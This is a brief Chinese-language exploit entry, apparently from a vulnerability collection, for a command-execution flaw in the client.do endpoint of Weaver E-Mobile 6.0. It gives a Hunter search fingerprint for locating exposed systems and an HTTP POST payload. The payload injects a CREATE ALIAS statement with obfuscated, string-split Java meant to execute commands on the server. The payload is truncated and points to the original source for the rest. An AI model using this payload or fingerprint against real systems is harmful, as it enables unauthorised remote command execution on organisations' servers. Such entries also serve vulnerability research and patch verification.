# 泛微E-Mobile6.0client.do存在命令执行漏洞

- **系统**：泛微OA　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`hunter：`app.name=="泛微 e-mobile OA"``
- **请求**：`POST /client.do HTTP/1.1`

**请求体 / payload**
```
数据包：
Host: 127.0.0.1
Cookie: JSESSIONID=abcZRb929ZuHEdfjFEAMy
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTm8YXcJeyKDClbU7
Content-Length: 1151
------WebKitFormBoundaryTm8YXcJeyKDClbU7
Content-Disposition: form-data; name="method"
getupload
------WebKitFormBoundaryTm8YXcJeyKDClbU7
Content-Disposition: form-data; name="uploadID"
1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws
java.la','ng.Exception{','Object curren','tRequest =
Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.ser
ver.dispatch.ServletInvoca…（脚本共 1307 字，完整版见原文）
```

**其他**
- 泛微E-Mobile 6.0 client.do存在命令执行漏洞: * 一、漏洞描述
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 泛微E-Mobile 6.0